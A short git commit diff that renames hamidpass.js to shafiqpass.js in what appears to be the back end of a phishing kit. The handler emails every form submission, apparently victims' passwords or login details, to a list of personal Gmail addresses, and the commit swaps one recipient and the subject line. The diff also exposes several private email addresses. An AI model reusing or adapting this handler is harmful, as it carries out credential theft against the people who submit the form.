13365c0074d0ecdb016b4f49534017a417d93392
linkquarry-hub <linkquarry@gmail.com>
2025-11-19 12:56:07 +0500

    Update and rename hamidpass.js to shafiqpass.js

--- shafiqpass.js
+++ shafiqpass.js
@@ -38,8 +38,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,h0541260@gmail.com",
-      subject: "Hamid",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,alizajack760@gmail.com",
+      subject: "shafiq",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
